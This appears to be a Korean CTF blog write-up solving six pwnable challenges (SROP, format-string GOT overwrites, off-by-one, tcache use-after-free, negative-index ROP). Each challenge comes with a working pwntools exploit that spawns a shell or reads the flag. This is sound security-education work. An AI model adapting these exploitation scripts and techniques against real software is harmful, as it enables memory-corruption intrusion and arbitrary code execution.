---
title: "SunShine CTF Writeup"
date: 2026-10-05 18:20:00 +0900
categories: [CTF, Pwnable]
tags: [CTF, Pwnable]
---

![clear](assets/img/CTF/SunShine/clear.png)  

## 1. Total Recall
함수 3개가 끝이다.
```c
__int64 start() {
  signed __int64 v0; // rax

  sub_401016();
  sub_40104F();
  v0 = sys_exit(0);
  return sub_401016();
}
```
`sub_401016` -> `sub_40104F` -> `sub_401016` 순서대로 호출한다.
```c
signed __int64 sub_401016() {
  signed __int64 v0; // rax
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  _UNKNOWN **v3; // [rsp+38h] [rbp-8h] BYREF
  _UNKNOWN *retaddr; // [rsp+40h] [rbp+0h] BYREF

  v3 = &retaddr;
  v0 = sys_write(1u, (const char *)&v3, 8uLL);
  return sys_read(0, buf, 0x18uLL);
}
```
우선 stack의 값을 write를 통해 화면에 출력하고, 0x18바이트만큼 입력받는다.

```c
signed __int64 sub_40104F() {
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
  return sys_read(0, buf, 0x400uLL);
}
```
해당 함수에서는 SROP를 위한 세팅을 진행할 수 있다.  
그러나 마땅한 가젯이 없으므로 SROP를 위한 rax 값인 15는 read의 리턴 값을 통해 세팅을 진행해야 한다.  
또한, rbp 레지스터를 사용하지 않으므로 ret 주소를 딱히 계산할 필요가 없다.  

즉, 처음 write를 통해 stack 주소값을 파악하고,  
첫 번째 read(0x400)을 통해 SROP를 세팅한다.  
이후 SROP를 호출하기 전에 `sub_40104F`를 한 번 더 호출하여 rax레지스터를 설정하면 된다.
```py
from pwn import *
p = remote("chal.sunshinectf.games", 26003)
context.arch = "amd64"

syscall = 0x40104c
read_ = 0x40104f

stack = u64(p.recvn(8))
success("stack: " + hex(stack))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
frame.rsp = stack

fb = bytes(frame)
binsh = stack + 0x10 + len(fb)
frame.rdi = binsh
fb = bytes(frame)

payload = b"A" * 0x80
payload += p64(read_) # set rax = 15
payload += p64(syscall) # Sigreturn
payload += fb
payload += b"/bin/sh\x00" # stack + 0x10 + len(fb)

p.send(b"A" * 0x18)
p.send(payload)
pause(1)

# set rax = 15
p.send(b"B" * 15)

p.interactive()
```
![total_recall](assets/img/CTF/SunShine/total_recall.png)  
FLAG: sun{r3caLl_ev3Ry_reGist3r_sR0p}  

## 2. Mad Libs
```c
__int64 __fastcall main(int a1, char **a2, char **a3) {
  int i; // [rsp+Ch] [rbp-114h]
  char s[264]; // [rsp+10h] [rbp-110h] BYREF
  ...
  for ( i = 0; i <= 7; ++i ) {
    printf("(%d) > ", i + 1);
    if (!fgets(s, 256, stdin)) break;
    printf(s);
  }
  return 0LL;
}
```
`printf(s)`에서 FSB가 발생하고, 이를 통해 pie_base, libc_base leak이 가능하다.  
또한, Partial RELRO이므로 GOT Overwrite가 가능하다.  
printf -> system으로 덮고, 입력으로 "/bin/sh"를 주면 된다.  

```py
from pwn import *
p = remote("chal.sunshinectf.games", 26001)
libc = ELF("./libc.so.6")

p.sendlineafter(b"> ", b"%47$p")
pie_base = int(p.recvline().strip(), 16) - 0x11c9
p.sendlineafter(b"> ", b"%38$p")
libc_base = int(p.recvline()[:-1], 16) - 0x2044e0

success("pie_base:  " + hex(pie_base))
success("libc_base: " + hex(libc_base))

printf_got = pie_base + 0x4010
system = libc_base + libc.symbols["system"]
success("system: " + hex(system))

system_low = system & 0xFFFF
system_mid = (system >> 16) & 0xFFFF

system_mid = system_mid - system_low
if system_mid < 0:
    system_mid += 0x10000

pay1 = f"%{system_low}c%13$hn".encode()
pay2 = f"%{system_mid}c%14$hn".encode()

payload = (pay1 + pay2).ljust(40, b"A")
payload += p64(printf_got) + p64(printf_got + 2)
p.sendlineafter(b"> ", payload)

p.sendline(b"/bin/sh\x00")
p.interactive()
```


![mad_libs](assets/img/CTF/SunShine/mad_libs.png)  
FLAG: sun{f1ll_iN_th3_g0T_eNtry}  

## 3. Print Print Revolution
이 문제도 FSB 문제이다.
```c
__int64 __fastcall main(int a1, char **a2, char **a3){
  ...
  while ( 1 ) {
    write(1, "score> ", 7uLL);
    v3 = read(0, v5, 0x1FFuLL);
    if ( v3 <= 0 ) break;
    v5[v3] = 0;
    v5[strcspn(v5, "\n")] = 0;
    sub_401330((unsigned __int8 *)v5);
    write(1, "\n", 1uLL);
  }
}
```
main에서는 **score>** 이후 0x1FF만큼 값을 입력받고,  
해당 값을 `sub_401330` 함수의 인자로 넘겨준다.  

이 함수에서는 입력한 값 문자 단위로 파싱을 진행한다.  
파싱하는 문자는 `%s, %p, %x, %w, $`가 있다.

```c
__int64 sub_401330(unsigned __int8 *buf, ...) {
  ...
  va_start(va, buf); // 
  v1 = buf;
  v2 = 0;
  for ( result = *buf; (_BYTE)result; v1 = v4 + 1 ) {
    if ( (_BYTE)result == '%' ) {
      result = v1[1];
      v4 = v1 + 1;
      if ( (unsigned __int8)(result - '0') > 9u ) {
        v5 = (unsigned int)++v2;
        v7 = (char)result <= 'w';
        if ( (_BYTE)result == 'w' )
          goto LABEL_19;
      }
      else {
        LODWORD(v5) = 0;
        do {
          v6 = v4++;
          v5 = (unsigned int)((char)(result - '0') + 10 * v5);
          LOBYTE(result) = *v4;
        } while ( (unsigned __int8)(*v4 - '0') <= 9u );
        if ( (_BYTE)result != '$' )
          goto LABEL_15;
        LOBYTE(result) = v6[2];
        v4 = v6 + 2;
        v7 = (char)result <= 'w';
        if ( (_BYTE)result == 'w' ) {
LABEL_19:
          sub_4012C0((const __m128i *)va, v5);
          v11 = sub_4012C0(v10, (int)v5 + 1);
          *v12 = v11;
          write(1, &unk_402006, 2uLL);
          goto LABEL_15;
        }
      }
LABEL_15:
    result = v4[1];
  }
}
```
우선 순서가 꼬였는데,  
입력이 `w`의 경우 `LABEL_19`로 이동한다.  
만약 숫자라면, `$`가 있는지 판단하고, 있으면 다음 입력이 `w`인지 판단한다.  
이후 `sub_4012c0` 함수를 호출한다.  
이후에는 사용자가 지정한 수조에 값에 리턴 값을 입력한다.

```c
__int64 __fastcall sub_4012C0(const __m128i *a1, int a2){
  __int64 v2; // rdi
  int i; // ecx
  __int64 result; // rax
  unsigned __int32 v5; // eax
  __int64 *v6; // rdx
  __m128i v7; // [rsp+0h] [rbp-20h]

  v7 = _mm_loadu_si128(a1);
  v2 = a1[1].m128i_i64[0];
  if ( a2 <= 0 ) return 0LL;
  for ( i = 0; i != a2; ++i ) {
    while ( 1 ) {
      v5 = v7.m128i_i32[0];
      if ( v7.m128i_i32[0] > 0x2Fu )
        break;
      ++i;
      v7.m128i_i32[0] += 8;
      result = *(_QWORD *)(v2 + v5);
      if ( a2 == i )
        return result;
    }
    v6 = (__int64 *)v7.m128i_i64[1];
    v7.m128i_i64[1] += 8LL;
    result = *v6;
  }
  return result;
}
```
인자 a1은 `va_list`이고, 레이아웃은 `struct { u32 gp_offset; u32 fp_offset; void *overflow_arg_area; void *reg_save_area; }`이다.  
즉, `gp_offset <= 47`이라면 레지스터에서, 넘어가면 스택에서 n번째 값을 불러온다. 

```c
if ( (_BYTE)result == 'p' ) goto LABEL_23;
else if ( (_BYTE)result == 'x' ) {
LABEL_23:
  v13 = sub_4012C0((const __m128i *)va, v5);
  v14 = &v19;
  v15 = '<';
  v18 = 'x0';
  do {
    ++v14;
    v16 = v13 >> v15;
    v15 -= 4;
    *(v14 - 1) = a0123456789abcd[v16 & 0xF];
  }
  while ( &v20 != v14 );
  write(1, &v18, 0x12uLL);
  goto LABEL_15;
}
```
만약 `$`가 아니라면 `p`나 `x`인지 판단한다.  
여기선 값을 화면에 출력한다.  
이를 통해 `libc_base`를 출력할 수 있다.

```py
from pwn import *
p = remote("chal.sunshinectf.games", 26002)
libc = ELF('./libc.so.6')

strcspn_got = 0x404010

p.recvuntil(b"score> ")
p.sendline(b"%73$x")

libc_base = int(p.recvline()[:-1], 16) - 0x2a1ca
success("libc_base: " + hex(libc_base))
system = libc_base + libc.symbols["system"]

# %7$w : *dest = value ; dest = buf[8:16], value = buf[16:24]
p.sendline(b"%7$w" + b"AAAA" + p64(strcspn_got) + p64(system))

p.recvuntil(b"score> ")
p.sendline(b"/bin/sh")

p.interactive()
```

![revolution](assets/img/CTF/SunShine/revolution.png)  
FLAG: sun{cust0m_fmtstr_n0_t00ls_4ll0wed}

## 4. Homemaker
```c
__int64 __fastcall sub_14CC(unsigned __int16 *a1, unsigned __int16 *a2, _BYTE *a3){
  char v4; // bl
  unsigned __int16 v6; // [rsp+24h] [rbp-1Ch]

  if ( (int)sub_1313((__int64)a1, 4uLL) < 0 )
    return 0xFFFFFFFFLL;
  if ( _byteswap_ushort(*a1) == 0x1B5B ){
    v6 = _byteswap_ushort(a1[1]);
    if ( v6 && (unsigned __int64)v6 + 7 <= 0x800 ) {
      if ( (int)sub_1313((__int64)(a1 + 2), v6 + 3LL) >= 0 ) {
        v4 = *((_BYTE *)a1 + v6 + 4);
        if ( v4 == (unsigned __int8)sub_11E9((__int64)(a1 + 2), v6) ) {
          if ( ((unsigned __int16)(*((unsigned __int8 *)a1 + v6 + 5) << 8) 
                | *((unsigned __int8 *)a1 + v6 + 6)) == 0x1B5C ) {
            *a2 = v6;
            return 0LL;
   ...
```
우선 입력 파싱을 진행한다.  
처음 4바이트 입력 시 a1[0]은 `\x1b5b`로 시작하는지 검사하고, a1[1]은 `(0x800 - 0x7)` 이하의 값인지 검사한다.  

이후 a1[1] + 3 크기만큼 a1[2]에 값을 입력받아 저장한다.  
처음 4바이트 + 입력값 위치와 `sub_11E9` 함수 리턴값 1바이트를 비교하고 (CRC),  
하위 2바이트는 `\x1b\x5c`로 시작하는지 마지막으로 검사한다.
또한, 모든 입력은 `_byteswap_ushort`이므로 `big-endian` 방식이다.  

이후 입력 값의 처음 1바이트를 기준으로 switch문이 실행된다.
```c
__int64 __fastcall sub_167C(__int64 a1, __int64 a2, __int16 a3){
  if ( a3 != 5 )
    return 4294967266LL;
  if ( (unsigned int)sub_1289(_byteswap_ulong(*(_DWORD *)(a2 + 1))) )
    return 4294967269LL;
  *(_WORD *)(a1 + 256) = 256;
  *(_WORD *)(a1 + 258) = 1;
  return 0LL;
}

__int64 __fastcall sub_1289(int a1){
  if ( a1 == 0x1337C35F ) return 0LL;
}
```
`1` 입력 시 다음 1바이트부터 값을 검증한다.  
즉, payload는 `ESC HDR + len(5) + switch(1) + val(4 == 0x1337C35F) + ESC END`로 전송해야 한다.  
이후에는 256을 스택에 작성하게 된다.

```c
__int64 __fastcall sub_174C(__int64 a1, __int64 a2, __int16 a3) {
  unsigned __int16 i; // [rsp+2Ch] [rbp-14h]

  if ( (unsigned __int16)(a3 - 1) > *(_WORD *)(a1 + 256) )
    return 4294967266LL;
  for ( i = 0; i <= (unsigned __int16)(a3 - 1); ++i )
    *(_BYTE *)(a1 + i) = *(_BYTE *)(a2 + 1 + i);
  ++*(_WORD *)(a1 + 258);
  return 0LL;
}
```
`2` 입력 시 이전에 입력한 256보다 큰지 작은지 검사한다.  
작다면 입력한 payload를 스택에 작성한다.  
그런데 여기서 len(data)는 `a3-1`이고, 그 만큼의 길이를 복사한다.  
즉, `off-by-one` 취약점이 발생하게 된다.

```c
unsigned __int64 __fastcall sub_1810(unsigned __int16 *a1){
  v2 = __readfsqword(0x28u);
  sub_13A2(0, a1, a1[128]);
  return v2 - __readfsqword(0x28u);
}
```
`3`입력 시 `a1+256` 크기만큼의 데이터를 스택에서 읽어온다.  
즉, 순서는
1. `1` 입력: len 지정
2. `2` 입력: off-by-one -> len 조작 (CRC 부분)
3. `3` 입력: info leak
이 된다.

```py
from pwn import *
p = remote("sunshinectf.games", 26008)

def CRC(d):
    v = 0
    for b in d:
        v ^= b; v &= 0xff
        for _ in range(8):
            v = (((v << 1) & 0xff) ^ 0x2f) if (v & 0x80) else ((v << 1) & 0xff)
    return v

def CRC_FF(data):
    data = bytearray(data)
    for i in range(256):
        if(CRC(data) == 0xFF): return data
        else: data[-1] = i

def ESC(payload, size, command, data):
    payload = b"\x1b\x5b"
    payload += p16(size, endian='big')
    payload += command
    payload += data
    payload += p8(CRC(command + data))
    payload += b"\x1b\x5c"
    return payload

# len = 256
payload = b""
payload = ESC(payload, 5, b"\x01", p32(0x1337c35f, endian='big'))
p.send(payload)

# trigger off-by-one
data = b"\x02" + b"A" * 256
data = CRC_FF(data)
payload = ESC(payload, 257, b"", data)
p.send(payload)

# leak
payload = ESC(payload, 1, b"\x03", b"")
p.send(payload)

p.recvuntil(b"A" * 0xFF)
p.recvn(9)
canary = u64(p.recvn(8))
stack = u64(p.recvn(8)) - 0x130
pie_base = u64(p.recvn(8)) - 0x1a9f
p.recvuntil(b"\x1b\x5c")

success("canary: " + hex(canary))
success("pie_base: " + hex(pie_base))
success("stack: " + hex(stack))

pop_rdi = pie_base + 0x12aa
ret = pie_base + 0x101a
system = pie_base + 0x12f7
bin_sh = pie_base + 0x4865

payload = b"\x02" + b"/bin/sh\x00" + b"A" * 248
payload += b"\xFF" * 0x8
payload += p64(canary)
payload += p64(stack + 0x110)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(system)
payload = ESC(payload, len(payload), b"", payload)
p.send(payload)
p.recvuntil(b"\x1b\x5c")

payload = ESC(payload, 9, b"\x04", b"/bin/sh\x00")
p.send(payload)
p.recvuntil(b"\x1b\x5c")

p.interactive()
```
![homemaker](assets/img/CTF/SunShine/homemaker.png)  
FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}


## 5. Cache Money

```c
__int64 sub_401420(){
  puts("\n--- MAIN MENU ---");
  puts("1) Open Wallet");
  puts("2) Deposit (write to ledger)");
  puts("3) Withdraw (read from ledger)");
  puts("4) Transfer");
  puts("5) Close Wallet");
  puts("6) List Wallets");
  puts("0) Exit");
  return __printf_chk(2LL, ">>> ");
}
```
위의 기능이 있다.  

```c
int open_wallet(){
  v2 = (char *)calloc(0x30uLL, 1uLL);
  if ( v2 ){
    if ( !fgets(v2, 16, stdin)
      || (v2[strcspn(v2, "\n")] = 0,
          __printf_chk(2LL, "size (0x%x - 0x%x): ", 0x20, 0x100),
          !fgets(v5, 32, stdin)) ) {
      exit(0);
    }
    v3 = (int)strtol(v5, 0LL, 10);
    *((_QWORD *)v2 + 4) = v3;
    v4 = malloc(v3);
    *((_QWORD *)v2 + 3) = v4;
    if ( v4 ) {
      __memset_chk(v4, 0LL, v3, v3);
      *((_QWORD *)v2 + 2) = 0LL;
      *((_DWORD *)v2 + 10) = 1;
      qword_4040C0[(int)v0] = v2;
    }
    free(v2);
  }
}
```
`open_wallet` 함수에서는 총 16개의 지갑을 idx로 분류하고,  
calloc(0x30)과 malloc(size)를 진행한다.
```md
0x4040c0[idx] = wallet
wallet + 0 = name
wallet + 16 = 0
wallet + 24 = ledger_ptr
wallet + 32 = size
wallet + 40 = 1
```
구조는 위처럼 된다.

```c
int deposit(){
  if ( (int)v0 >= 0 ){
    v1 = qword_4040C0[(int)v0];
    if ( v1 && *(_DWORD *)(v1 + 40) ) {
      if ( *(_QWORD *)(v1 + 24) ) {
        v0 = read(0, *(void **)(v1 + 24), *(_QWORD *)(v1 + 32));
        if ( v0 > 0 ){
          v2 = v0 + *(_QWORD *)(v1 + 16);
          *(_QWORD *)(v1 + 16) = v2;
        }
      }
}
```
`deposit` 함수에서는 이전에 open한 지갑에 한해서 size만큼 값을 입력받는다.  

```c
int withdraw(){
  if ( !fgets(v3, 32, stdin) ) exit(0);
  v0 = strtol(v3, 0LL, 10);
  if ( v0 > 0xF )
    return puts("[!] Invalid wallet index.");
  v1 = qword_4040C0[v0];
  if ( !v1 || !*(_DWORD *)(v1 + 40) )
    return puts("[!] That wallet is not active.");
  if ( !*(_QWORD *)(v1 + 24) )
    return puts("[!] Wallet has no ledger.");
  __printf_chk(2LL, "[+] Ledger contents for \"%s\" (%zu bytes):\n    ", (const char *)v1, *(_QWORD *)(v1 + 32));
  write(1, *(const void **)(v1 + 24), *(_QWORD *)(v1 + 32));
  return __printf_chk(2LL, "\n[+] Current balance: %lu\n", *(_QWORD *)(v1 + 16));
}
```
`withdraw`함수에서는 wallet과 ledger가 존재하면 값을 출력한다.

```c
int transfer(){
  result = sub_401510("Transfer FROM which wallet?");
  if ( result >= 0 ) {
    v1 = qword_4040C0[result];
    if ( v1 && *(_DWORD *)(v1 + 40) ) {
      if ( *(_QWORD *)(v1 + 24) ){
        result = sub_401510("Transfer TO which wallet?");
        if ( result >= 0 ){
          v2 = qword_4040C0[result];
          if ( v2 && *(_DWORD *)(v2 + 40) ) {
            free(*(void **)(v1 + 24));
            *(_QWORD *)(v2 + 24) = *(_QWORD *)(v1 + 24);
            *(_QWORD *)(v2 + 32) = *(_QWORD *)(v1 + 32);
            *(_QWORD *)(v2 + 16) += *(_QWORD *)(v1 + 16);
            *(_QWORD *)(v1 + 16) = 0LL;

            v3 = *(_QWORD *)(v2 + 16);
            *(_QWORD *)(v1 + 24) = 0LL;
            *(_QWORD *)(v1 + 32) = 0LL;
            *(_DWORD *)(v1 + 40) = 0;
            ...
}
```
`transfer`함수에서는 src, dst wallet을 정하여 해당 값을 복사해준다.  
그런데 `free(src->ledger)`연산 진행 후에 남은 dangling pointer를 그대로 `dst->ledger`로 넘겨준다.  
여기서 UAF 취약점이 발생하게 된다.  
즉, 이미 free한 `src->ledger` 주소가 그대로 `dst->ledger`로 들어가게 된다.  
이 상태에서 `withdraw`함수 호출 시 safe_link leak이 가능하다.  

이후 `deposit`함수를 통해 `tcache poisoning`이 가능하여, 원하는 위치에 청크 할당이 가능하다.  
이를 이용하여 익스플로잇을 진행할 수 있다.

```py
from pwn import *

p = remote("chal.sunshinectf.games",26004)

wallet = 0x4040c0
puts_got = 0x404008
strtol_got = 0x404040

def menu(n):
    p.sendlineafter(b">>> ", str(n).encode())

def create(name,size):
    menu(1);
    p.sendlineafter(b"Wallet name: ", name)
    p.sendlineafter(b"Ledger size (0x20 - 0x100): ", str(size).encode())

def deposit(i, data):
    menu(2)
    p.sendlineafter(b"): ", str(i).encode()); p.sendafter(b"data: ", data)

def withdraw(i):
    menu(3)
    p.sendlineafter(b"): ", str(i).encode())

def transfer(src, dst):
    menu(4)
    p.sendlineafter(b"Transfer FROM which wallet? (0-15): ", str(src).encode())
    p.sendlineafter(b"Transfer TO which wallet? (0-15): ", str(dst).encode())

def dummy():
    p.recvline()
    p.recvn(4)

# tcache poison (0x90)
for i in range(4):
    create(b"sy46", 0x80)

transfer(0, 1)
withdraw(1)
dummy()
safe_link = u64(p.recvn(6).ljust(8, b"\x00"))
success("safe_link: " + hex(safe_link))

transfer(2, 3)
deposit(3, p64(safe_link ^ wallet))

# dummy + wallet
create(b"A", 0x80)
create(b"B", 0x80)

# fake wallets + libc leak via puts@GOT
"""
wallet + 0 = name
wallet + 16 = 0
wallet + 24 = ledger_ptr
wallet + 32 = size
wallet + 40 = 1
"""
# 0x4040c0
payload = p64(0x4040d0) # 1st wallet
payload += p64(0x404100) # 2nd wallet

# 0x4040d0, idx = 0 wallet
payload += p64(0) * 3
payload += p64(wallet)
payload += p64(0x80)
payload += p64(1)

# 0x404100, idx = 1 wallet
payload += p64(0) * 3
payload += p64(0x404008)
payload += p64(8)
payload += p64(1)

deposit(5, payload)

# wallet = 0x404100, ledget = 0x404124(= puts_got)
withdraw(1)
dummy()
libc_base = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x87bd0
success("libc_base: " + hex(libc_base))
system = libc_base + 0x58740

# overwrite strtol_got -> system
# 0x4040c0
payload = p64(0x4040d0)
payload += p64(0x404100)

# 0x4040c0
payload += p64(0) * 3
payload += p64(wallet)
payload += p64(0x80)
payload += p64(1)

# 0x404100
payload += p64(0) * 3
payload += p64(strtol_got)
payload += p64(8)
payload += p64(1)
deposit(0, payload)

# strtol_got -> system
deposit(1, p64(system))
p.sendlineafter(b">>> ", b"/bin/sh\x00")

p.interactive()
```

![cache_money](assets/img/CTF/SunShine/cache_money.png)  
cache_memory: sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}


## 6. Safe House
`fork`로 부모(shell)와 자식(vault) 프로세스로 분리되어 있다.  
flag는 자식만 fd로 쥐고, 부모는 seccomp로 가둔다.
```c
if ( socketpair(1, 1, 0, fds) < 0
  || (v3 = getpid(),
      v4 = 0x45D9F3B * ((0x45D9F3B * v3) ^ ((unsigned int)(0x45D9F3B * v3) >> 16)),
      dword_405060 = HIWORD(v4) ^ v4,
      v5 = fork(),
      v5 < 0) ) {
  _exit(1);
}
if ( !v5 ) {
  close(fds[0]);
  dup2(fds[1], 3);
  if ( fds[1] != 3 )
    close(fds[1]);
  v13 = open("/dev/null", 2);
  dup2(v13, 0);
  v14 = v13;
  v15 = &dword_405080;
  dup2(v14, 1);
  signal(13, (__sighandler_t)1);

  v16 = open("flag.txt", 0);
  dword_405080 = 2;
  dword_405084 = v16;
  do {
    v15 += 259;
    *v15 = 2;
    v15[1] = open("/dev/null", 0);
  }
  while ( v15 != &dword_405080 + 777 );
```
`flag.txt`를 fd로 열어 `dword_405080=2`, `dword_405084=flag_fd`에 저장하고, fd 3을 부모와의 소켓으로 쓴다.  
난독화 키 `dword_405060`은 fork 전에 계산되어 부모와 자식 프로세스가 공유한다.  
이후 `sub_401C40` 함수를 호출한다.
```c
__int64 __fastcall sub_401C40(_BYTE *a1, _BYTE *a2, unsigned __int16 *a3) {
  for ( i = 0LL; i <= 3; i += v5 ) {
    v5 = read(3, &v11 + i, 4 - i);
  }
  sub_401BE0(&v11, 4LL, dword_405060);
  *a1 = v11;
  v7 = v12;
  v8 = __ROL2__(v12, 8);
  *a3 = v8;
  if ( v7 ) {
    v9 = 0LL;
    while ( 1 ) {
      v10 = read(3, &a2[v9], v8 - v9);
      if ( v10 <= 0 )
        break;
      v9 += v10;
      if ( v9 >= v8 ) {
        sub_401BE0(a2, *a3, dword_405060);
        return 0LL;
      }
    }
    return 0xFFFFFFFFLL;
  }
  return 0LL;
}
```
`sub_401C40`함수는 자식의 요청 수신 루틴이다.  
fd 3에서 4바이트 헤더를 읽어 `sub_401BE0` 함수로 키 난독화를 풀고, `*a1`=opcode, `*a3`=길이로 돌려준다.  
이후 payload를 `a2`에 받아 다시 복호화한다.  
즉 GET 핸들러의 `v25`/`buf`/`v26`을 채운다.  

```c
ssize_t __fastcall sub_401D50(char a1, _DWORD *a2, unsigned __int16 a3) {

  v3 = a2;
  v4 = a3;
  v5 = 0LL;
  v11 = a1;
  v12 = __ROL2__(a3, 8);
  v13 = 0;
  sub_401BE0(&v11, 4LL, (unsigned int)dword_405060);
  do {
    result = write(3, &v11 + v5, 4 - v5);
    if ( result <= 0 ) break;
    v5 += result;
  }
  while ( v5 <= 3 );
  if ( v4 ) {
    v7 = v14;
    if ( v4 > 0x400u ) v4 = 1024;
    if ( v4 >= 8u ) {
      v10 = (unsigned __int64)v4 >> 3;
      qmemcpy(v14, a2, 8 * v10);
      v7 = &v14[8 * v10];
      v3 = &a2[2 * v10];
    }
    sub_401BE0(v14, v4, (unsigned int)dword_405060);
    v9 = 0LL;
    do {
      result = write(3, &v14[v9], v4 - v9);
      if ( result <= 0 )
        break;
      v9 += result;
    }
    while ( v9 < v4 );
  }
  return result;
}
```
`sub_401D50`함수는 `sub_401C40`의 반대쪽, 즉 부모와 자식 프로세스 간에 프레임을 전송한다.  
`[opcode][len(big-endian)]` 4바이트 헤더와 payload를 `v14`로 복사한 뒤 난독화해 `write(3, ...)`로 보낸다.  
```c
v17 = sub_401C40(&v25, buf, &v26);
...
else if ( SLODWORD(buf[0]) > 15 ) {
  sub_401D50(2LL, "range", 5LL);
}
else {
  v23 = (char *)&unk_4060B0 + 1036 * SLODWORD(buf[0]);
  if ( *(_DWORD *)v23 == 1 ) {
    sub_401D50(0LL, v23 + 12, *((unsigned __int16 *)v23 + 4));
  }
  else if ( *(_DWORD *)v23 == 2 ) {
    v24 = pread(*((_DWORD *)v23 + 1), s, 0x400uLL, 0LL);
    if ( v24 > 0 )
      v17 = (unsigned __int16)v24;
    sub_401D50(0LL, s, v17);
  }
}
```
인덱스 `SLODWORD(buf[0])`는 검사가 `> 15` 하나뿐이라 음수에 대한 제한이 없다.  
1. flag fd는 0x405080에 존재한다.
2. `index = -4`
3. `&unk_4060B0 + 1036*(-4)` = 0x405080
4. `pread(flag_fd, ...)`로 flag를 읽을 수 있다.
```c
close(fds[1]);
dup2(fds[0], 3);
if ( fds[0] != 3 )
  close(fds[0]);
buf[6] = 0x101000015LL;
buf[8] = 0x301000015LL;
buf[10] = 0x901000015LL;
buf[0] = 0x400000020LL;
buf[12] = 0xA01000015LL;
buf[1] = 0xC000003E00010015LL;
buf[14] = 0xC01000015LL;
buf[5] = 0x7FFF000000000006LL;
buf[16] = 0xF01000015LL;
buf[2] = 0x8000000000000006LL;
buf[18] = 0xE701000015LL;
buf[20] = 0x8000000000000006LL;
*(_WORD *)s = 21;
buf[3] = 32LL;
buf[4] = 16777237LL;
v29 = buf;
prctl(38, 1LL, 0LL, 0LL, 0LL);
if ( syscall(317LL, 1LL, 0LL, s) < 0 )
  prctl(22, 2LL, s);
sub_401C20("SafeHouse v1.0\nType HELP.\n");
```
`buf[]`는 BPF 필터 배열로, `prctl(38, 1, ...)`은 `PR_SET_NO_NEW_PRIVS`를, `syscall(317, ...)`은 `seccomp`다.  
`open`/`execve` 류가 막혀 부모는 flag를 직접 접근하지 못하므로 자식 프로세스를 통해 flag를 읽어야 한다.

```c
if ( !strncmp((const char *)i, "NOTE", 4uLL) ) {
  if ( *((_BYTE *)i + 4) == ' ' ) {
    v10 = strtol((const char *)i + 5, (char **)s, 10);
    if ( v10 > 7 )
      write(1, "ERR bad idx\n", 0xCuLL);
    else {
      for ( j = *(const char **)s; *j == ' '; *(_QWORD *)s = ++j )
        ;
      strncpy(&byte_40A180[64 * v10], j, 0x3FuLL)[63] = 0;
    }
  }
  goto LABEL_9;
}
if ( !strncmp((const char *)i, "RELAY", 5uLL) ) {
  v9 = 0LL;
  if ( *((_BYTE *)i + 5) == ' ' )
    v9 = (char *)i + 6;
  sub_401F70(v9);
  goto LABEL_9;
}
if ( !strncmp((const char *)i, "SUBMIT", 6uLL) ) {
  v12 = 0LL;
  if ( *((_BYTE *)i + 6) == ' ' )
    v12 = (char *)i + 7;
  sub_401ED0(v12);
  goto LABEL_9;
}
```
여기서 쉘에 입력할 수 있는 명령어를 알 수 있다.  
`NOTE`는 `idx`와 `text`를 입력받아 `strncpy`로 고정 주소 `0x40A180`에 쓴다.  
`RELAY`명령어는 `sub_401F70`를 호출하고, `SUBMIT`명령어는 `sub_401ED0`함수를 호출한다.  

```c
__int64 __fastcall sub_401ED0(const char *a1) {
  unsigned __int8 v1;
  __int64 result;
  __int64 v3;

  v1 = strtol(a1, 0LL, 10);
  if ( !v1 )
    return write(1, "ERR bad size\n", 0xDuLL);
  write(1, "GO\n", 3uLL);
  result = read(0, &v3, v1);
  if ( result > 0 )
    return write(1, "OK\n", 3uLL);
  return result;
}
```
`SUBMIT` 명령어를 통해 size를 입력받으나,  
read 함수 실행 시 크기 검사가 없어 stack buffer overflow가 발생하게 된다.
```c
ssize_t __fastcall sub_401F70(const char *a1) {
  if ( !a1 )
    return write(1, "ERR usage: RELAY <op> [data]\n", 0x1DuLL);
  v1 = strtol(a1, 0LL, 10);
  if ( (unsigned __int64)(v1 - 1) > 3 )
    return write(1, "ERR bad op\n", 0xBuLL);
  v7 = v1;
  v9 = 0;
  v8 = 0;
  sub_401BE0(&v7, 4LL, (unsigned int)dword_405060);
  write(3, v2, 4uLL);
  v3 = read(3, buf, 0x100uLL);
  if ( v3 <= 3 )
    return write(1, "ERR no response\n", 0x10uLL);
  sub_401BE0(buf, v3, (unsigned int)dword_405060);
  v5 = buf[2] | (buf[1] << 8);
  if ( !buf[0] && v5 && (unsigned __int16)(v4 - 4) >= v5 )
    write(1, v11, v5);
  return write(1, "\n", 1uLL);
}
```
`RELAY`는 op 1~4를 자식에 보내고 응답을 받아 복호 후 `write(1, v11, v5)`로 출력한다.  
자식 응답을 사용자가 보는 유일한 경로지만, payload를 보낼 수 없기에 ROP를 통해 `sub_401D50`함수를 직접 호출해야 한다.  

```py
from pwn import *
p = remote("chal.sunshinectf.games",26007)

pop_rdi = 0x401529
pop_rsi = 0x401dd5
gadget = 0x401c31          # pop rbx ; mov rdx, rax ; jmp write@plt
prompt = 0x4014d0
dummy = 0x409000
notes = 0x40A180

# idx = -4 (0xFFFFFFFC)
p.sendafter(b"sh> ", b'NOTE 0 '+b'\xFC\xFF\xFF\xFF'+b'\n')

# SUBMIT overflow:rdx=8, sub_401D50(3, NOTES, 8) -> child get(idx = -4) -> pread flag -> fd3
p.sendlineafter(b"sh> ", b"SUBMIT 255")

chain = b"A" * 0x48
# rax=8
chain += p64(pop_rdi) + p64(dummy) + p64(pop_rsi) + p64(8) + p64(0x401be0)
# rdx=8 (persists), harmless write
chain += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x402000) + p64(gadget) + p64(0)
chain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(notes) + p64(0x401d50) + p64(prompt)
p.send(chain)

p.sendlineafter(b"sh> ", b'RELAY 1')
p.interactive()
```

![safe_house](assets/img/CTF/SunShine/safe_house.png)  
safe_house: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}